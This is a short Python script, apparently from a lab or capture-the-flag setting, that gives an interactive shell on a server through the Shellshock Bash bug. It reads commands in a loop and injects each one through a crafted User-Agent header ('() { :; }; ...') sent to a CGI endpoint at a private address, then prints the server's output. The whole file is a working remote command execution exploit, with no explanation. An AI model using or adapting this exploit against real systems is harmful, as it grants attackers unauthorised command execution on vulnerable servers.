import requests

while True:
    cmd = input("> ")
    headers = {
            'User-Agent' : '() { :; }; echo "Content-Type: text/html"; echo; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; %s' % (cmd)
    }
    print((requests.get('http://192.168.1.31:591/cgi-bin/cat', headers = headers, timeout=5).text).strip())
